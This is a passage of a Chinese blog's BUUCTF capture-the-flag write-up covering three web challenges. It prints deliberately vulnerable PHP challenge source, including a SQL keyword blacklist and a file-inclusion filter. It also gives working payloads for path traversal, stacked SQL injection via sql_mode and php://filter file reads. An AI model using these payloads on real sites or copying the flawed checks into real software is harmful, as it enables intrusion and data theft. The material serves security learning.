<!DOCTYPE HTML>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

    

    <title>BUUCTF Write Up(持续更新) | 2h0nG&#39;s Blog</title>
    <meta name="author" content="John Doe">
    
    <meta name="description" content="Love is friendship fell into love">
    
    
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    <meta property="og:title" content="BUUCTF Write Up(持续更新)"/>
    <meta property="og:site_name" content="2h0nG&#39;s Blog"/>

    
    <meta property="og:image" content=""/>
    

    <link rel="icon" type="image/png" href="/favicon.png">
    <link rel="alternate" href="/atom.xml" title="2h0nG&#39;s Blog" type="application/atom+xml">
    <link rel="stylesheet" href="/css/lib/materialize.min.css">
    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">

    
        <link rel="stylesheet" href="/css/lib/prettify-tomorrow-night-eighties.css" type="text/css">
    
    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
<meta name="generator" content="Hexo 5.0.0"></head>


<body>
    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">

    <nav class="indigo">
    <div class="nav-wrapper">
        <a href="#" data-activates="main-menu" class="button-collapse">
            <i class="fa fa-navicon"></i>
        </a>
        <div class="">
            <a href="/" class="brand-logo hide-on-med-and-down">2h0nG&#39;s Blog</a>
            <ul class="right hide-on-med-and-down">
                
                    <li>
                        <a class="menu-home " href="/" >
                            <i class="fa fa-home "></i>
                            
                            首页
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-archive " href="/archives" >
                            <i class="fa fa-archive "></i>
                            
                            归档
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
                            <i class="fa fa-bookmark "></i>
                            
                            分类
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-reading " href="/reading" >
                            <i class="fa fa-book "></i>
                            
                            读书
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-about " href="/about" >
                            <i class="fa fa-user "></i>
                            
                            关于
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-search modal-trigger " href="#search" >
                            <i class="fa fa-search "></i>
                            
                            搜索
                        </a>
                    </li>
                
            </ul>
            <div>
    <ul class="side-nav indigo darken-1" id="main-menu">
        
        <li class="side-user">
            <div class="row">
                <div class="col s4 no-padding">
                    <img class="avatar-image circle responsive-img" src="http://ww2.sinaimg.cn/small/74990035jw1f1rjkd681bj20rs0rsdhg.jpg" alt="User Avatar">
                </div>
                <div class="info col s8 valign-wrapper no-padding">
                    <div class="valign">
                        <p class="name">2h0nG</p>
                        <p class="desc">不断学习中</p>
                    </div>
                </div>
            </div>
        </li>
        

        
            <li class="no-padding">
                <a class="waves-effect menu-home " href="/" >
                    <i class="fa fa-home "></i>
                    
                    首页
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-archive " href="/archives" >
                    <i class="fa fa-archive "></i>
                    
                    归档
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
                    <i class="fa fa-bookmark "></i>
                    
                    分类
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-reading " href="/reading" >
                    <i class="fa fa-book "></i>
                    
                    读书
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-about " href="/about" >
                    <i class="fa fa-user "></i>
                    
                    关于
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-search modal-trigger " href="#search" >
                    <i class="fa fa-search "></i>
                    
                    搜索
                </a>
            </li>
        
    </ul>

    <ul class="side-nav indigo darken-1" id="category-menu">
    

            

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/数据通信安全/">
                    数据通信安全 <span class="right">30 篇</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/代码审计安全/">
                    代码审计安全 <span class="right">10 篇</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/Linux系统安全/">
                    Linux系统安全 <span class="right">13 篇</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/Web渗透测试/">
                    Web渗透测试 <span class="right">27 篇</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/CTF笔记/">
                    CTF笔记 <span class="right">16 篇</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/Python学习/">
                    Python学习 <span class="right">3 篇</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/Leetcode题解/">
                    Leetcode题解 <span class="right">24 篇</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/漏洞复现与分析/">
                    漏洞复现与分析 <span class="right">5 篇</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/数据恢复/">
                    数据恢复 <span class="right">2 篇</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/内网渗透/">
                    内网渗透 <span class="right">2 篇</span></a>
                </a>
            </li>

        

    </ul>
</div>

        </div>
    </div>
</nav>

<div id="search" class="modal search-modal">
    <div class="row">
        <div class="input-field col s12">
              <input id="search-input" type="text">
              <label for="search-input">搜索</label>
        </div>

    </div>
    <div id="search-result" class="search-result col s12">

    </div>
</div>


    <main>
        <div class="container main-container">
    <nav class="page-nav hide-on-small-only">
    <div class="nav-wrapper indigo">
        <span class="breadcrumb">当前位置（分类目录）</span>
        
            
    
    
    <a class="breadcrumb" href="/categories/CTF笔记/">CTF笔记</a>


        

        
    </div>
</nav>

<article>
    <div class="card">
        <div class="card-content">
            

            <div class="article-title">
                
    
        <h1>BUUCTF Write Up(持续更新)</h1>
    


            </div>
            <time class="pink-link-context" datetime="2020-11-18T16:00:00.000Z"><a href="/2020/11/19/CTF%E7%AC%94%E8%AE%B0/BUUCTF%20Write%20Up(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/">2020-11-19</a></time>

            <span id="busuanzi_container_page_pv" class="read-times-container">
    <i class="fa fa-eye"></i>
    <span id="busuanzi_value_page_pv"></span>
</span>

            
    <div class="tags-row">
        
            <a href="/tags/CTF笔记/" class="chip pink lighten-1">CTF笔记</a>
        
    </div>


            <div class="toc pink-link-context hide-on-med-and-down">
    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#BUUCTF-Write-Up"><span class="section table-of-contents-text">BUUCTF Write Up</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%80%E3%80%81-HCTF-2018-Warm-Up"><span class="section table-of-contents-text">一、[HCTF 2018]Warm Up</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E3%80%81-SUCTF-2019-EasySQL1"><span class="section table-of-contents-text">二、[SUCTF 2019]EasySQL1</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#%E8%A7%A3%E6%B3%951%EF%BC%9A"><span class="section table-of-contents-text">解法1：</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#%E8%A7%A3%E6%B3%952%EF%BC%9A"><span class="section table-of-contents-text">解法2：</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="section table-of-contents-text">总结：</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%89%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="section table-of-contents-text">三、[极客大挑战 2019]Secret File</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%9B%9B%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="section table-of-contents-text">四、[极客大挑战 2019]EasySQL</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%94%E3%80%81-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="section table-of-contents-text">五、[ACTF2020 新生赛]Include</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%85%AD%E3%80%81-%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="section table-of-contents-text">六、[护网杯 2018]easy_tornado</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%83%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="section table-of-contents-text">七、[极客大挑战 2019]LoveSQL</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%85%AB%E3%80%81-GXYCTF2019-Ping-Ping-Ping"><span class="section table-of-contents-text">八、[GXYCTF2019]Ping Ping Ping</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B9%9D%E3%80%81-RoarCTF-2019-Easy-Calc"><span class="section table-of-contents-text">九、[RoarCTF 2019]Easy Calc</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%8D%81%E3%80%81-HCTF-2018-admin"><span class="section table-of-contents-text">十、[HCTF 2018]admin</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%8D%81%E4%B8%80%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="section table-of-contents-text">十一、[极客大挑战 2019]BabySQL</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="section table-of-contents-text">十二、[极客大挑战 2019]Upload</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%8D%81%E4%B8%89%E3%80%81-SUCTF-2019-CheckIn"><span class="section table-of-contents-text">十三、[SUCTF 2019]CheckIn</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%8D%81%E5%9B%9B%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag"><span class="section table-of-contents-text">十四、[极客大挑战 2019]BuyFlag</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%8D%81%E4%BA%94%E3%80%81-BJDCTF2020-Easy-MD5"><span class="section table-of-contents-text">十五、[BJDCTF2020]Easy MD5</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%8D%81%E5%85%AD%E3%80%81-ZJCTF-2019-NiZhuanSiWei"><span class="section table-of-contents-text">十六、[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%8D%81%E4%B8%83%E3%80%81-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World"><span class="section table-of-contents-text">十七、[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%8D%81%E5%85%AB%E3%80%81-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook"><span class="section table-of-contents-text">十八、[网鼎杯 2018]Fakebook</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%8D%81%E4%B9%9D%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="section table-of-contents-text">十九、[极客大挑战 2019]HardSQL</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E5%8D%81%E3%80%81-GXYCTF2019-BabySQli"><span class="section table-of-contents-text">二十、[GXYCTF2019]BabySQli</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E5%8D%81%E4%B8%80%E3%80%81-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz"><span class="section table-of-contents-text">二十一、[网鼎杯 2020 青龙组]AreUSerialz</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E5%8D%81%E4%BA%8C%E3%80%81-BJDCTF-2nd-fake-google"><span class="section table-of-contents-text">二十二、[BJDCTF 2nd]fake google</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E5%8D%81%E4%B8%89%E3%80%81-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2"><span class="section table-of-contents-text">二十三、[强网杯 2019]高明的黑客</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E5%8D%81%E5%9B%9B%E3%80%81-GYCTF2020-Blacklist"><span class="section table-of-contents-text">二十四、[GYCTF2020]Blacklist</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E5%8D%81%E4%BA%94%E3%80%81-RoarCTF-2019-Easy-Java"><span class="section table-of-contents-text">二十五、[RoarCTF 2019]Easy Java</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E5%8D%81%E5%85%AD%E3%80%81-BUUCTF-2018-Online-Tool"><span class="section table-of-contents-text">二十六、[BUUCTF 2018]Online Tool</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#%E9%87%8D%E7%82%B9%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="section table-of-contents-text">重点函数：</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#Shell%E4%B8%AD%E7%9A%84%E9%87%8D%E7%82%B9%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="section table-of-contents-text">Shell中的重点基础知识：</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E5%8D%81%E4%B8%83%E3%80%81-MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2"><span class="section table-of-contents-text">二十七、[MRCTF2020]你传你🐎呢</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E5%8D%81%E5%85%AB%E3%80%81"><span class="section table-of-contents-text">二十八、</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E5%8D%81%E4%B9%9D%E3%80%81CVE-2020-7066"><span class="section table-of-contents-text">二十九、CVE-2020-7066</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%89%E5%8D%81%E3%80%81"><span class="section table-of-contents-text">三十、</span></a></li></ol></li></ol>
</div>


            <div class="entry pink-link-context">
                <h2 id="BUUCTF-Write-Up"><a href="#BUUCTF-Write-Up" class="headerlink" title="BUUCTF Write Up"></a>BUUCTF Write Up</h2><h3 id="一、-HCTF-2018-Warm-Up"><a href="#一、-HCTF-2018-Warm-Up" class="headerlink" title="一、[HCTF 2018]Warm Up"></a>一、[HCTF 2018]Warm Up</h3><p>开局一滑稽，源码找玄机。source.php，关键在这里。</p>
<p>​    审计源码，目的是绕过以下主函数代码，需要传入一个参数file，并且通过字符串检查和一个emmm类中的checkFile方法的检查，最终执行一个include函数，这里明显是通过检查并且通过include读取flag文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>​    审计checkfile方法，发现有一个白名单数组，里面有一个hint.php，打开一看，原来是提示了flag的文件名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p>mb_substr(arg1,arg2,arg3)：从arg1中截取arg2-arg3的字符串；mb_strpos(arg1,arg2)：从arg1中找到arg2第一次出现的位置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];    #白名单</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;    #是否传入参数，是否参数为字符串</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;    #判断参数是否在白名单，如果不在继续判断</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(    #截取第一个?前的值，如果没?，则是整个字符串，因为函数中自己加了一个?</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)    </span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;    #再次判断是否在白名单，如果不在继续判断，这里在?前加一个白名单的值其实就可以构造payload了。</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);    #这里进行一次url解码</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)    #然后截取第一个?前的值判断是否在白名单</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>urldecode解码前的判断就已经可以构造payload了，通过对payload的构造可以实现目录任意穿越读取。不停的尝试，最终读取到flag</p>
<p>Payload：<code>http://4526f00b-4a4c-435b-9112-69769b94c105.node3.buuoj.cn/source.php?file=hint.php?/../../../../ffffllllaaaagggg</code></p>
<h3 id="二、-SUCTF-2019-EasySQL1"><a href="#二、-SUCTF-2019-EasySQL1" class="headerlink" title="二、[SUCTF 2019]EasySQL1"></a>二、[SUCTF 2019]EasySQL1</h3><p>nmd，这题头得多铁能猜到后台源码是：<code>select $_POST[&#39;query&#39;]||flag from Flag</code>，这就是大佬的世界？完全没逻辑的猜测。听说CTF现场有源码泄露，但是BUUCTF上没有进行复现，具体怎么泄露的源码也没有找到WriteUp，Ok。</p>
<p>另外，此题采用<code>mysqli_multi_query()</code>运行SQL语句，所以是可堆叠注入。</p>
<p>泄露的源码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;&#x2F; a&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;query&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    if(isset($post[&#39;query&#39;]))&#123;</span><br><span class="line">        $BlackList &#x3D; &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;</span><br><span class="line">        &#x2F;&#x2F;var_dump(preg_match(&quot;&#x2F;&#123;$BlackList&#125;&#x2F;is&quot;,$post[&#39;query&#39;]));</span><br><span class="line">        if(preg_match(&quot;&#x2F;&#123;$BlackList&#125;&#x2F;is&quot;,$post[&#39;query&#39;]))&#123;</span><br><span class="line">            &#x2F;&#x2F;echo $post[&#39;query&#39;];</span><br><span class="line">            die(&quot;Nonono.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(strlen($post[&#39;query&#39;])&gt;40)&#123;</span><br><span class="line">            die(&quot;Too long.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql &#x3D; &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        do&#123;</span><br><span class="line">            if($res &#x3D; mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                while($row &#x3D; mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;while(@mysqli_next_result($MysqlLink));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h4><p><strong>Payload</strong>：<code>*,1</code>  ===&gt;    <code>select *,1||flag from Flag;</code>， </p>
<p><code>1||flag</code>作为一个结果为boolean类型的值相当于1。（如果是*,0 则0||flag为0false），因此执行核心查询语句<code>select * from Flag</code></p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/0fZZNt"><img src="https://s1.ax1x.com/2020/10/13/0fZZNt.png" alt="0fZZNt.png"></a></p>
<h4 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h4><p>把这个<code>||</code>或字符咱们给它运用上，这里涉及到Mysql的<code>sql_mode</code>的设置，通过变量的方式去配置它。</p>
<blockquote>
<p>sql_mode : 它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的PIPES_AS_CONCAT将 ||视为字符串的连接操作符而非 “或” 运算符 </p>
</blockquote>
<p>因此当<code>set sql_mode=PIPES_AS_CONCAT</code>时，这个<code>||</code>就相当于字符串连接函数concat(‘’,’’)辣。</p>
<p><strong>payload:</strong><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
<p>相当于：<code>select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</code>，这里<code>1||flag</code> ==&gt; <code>concat(1,&#39;flag&#39;)</code></p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/0fZjKg"><img src="https://s1.ax1x.com/2020/10/13/0fZjKg.png" alt="0fZjKg.png"></a></p>
<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a><strong>总结：</strong></h4><p>希望从这里学习到一些新思路，在遇到堆叠注入有特殊的字符时，可以思考sql_mode这个设置，能否将特殊字符变得合理可利用化。</p>
<h3 id="三、-极客大挑战-2019-Secret-File"><a href="#三、-极客大挑战-2019-Secret-File" class="headerlink" title="三、[极客大挑战 2019]Secret File"></a>三、[极客大挑战 2019]Secret File</h3><p>​    F12找第一个超链接Archive_room.php，然后有一个button是第二个超链接action.php，点击后发现302直接重定向到了end.php，bp抓包看到了这个神秘得小家伙，secr3t.php。</p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/B3RuKx"><img src="https://s1.ax1x.com/2020/10/28/B3RuKx.png" alt="B3RuKx.png"></a></p>
<p>​    secr3t.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">&quot;../&quot;</span>)||stristr($file, <span class="string">&quot;tp&quot;</span>)||stristr($file,<span class="string">&quot;input&quot;</span>)||stristr($file,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>OK，典型的文件包含，包含一下flag.php，发现没有显示flag，那就filter/convert.base64-encode一下叭。</p>
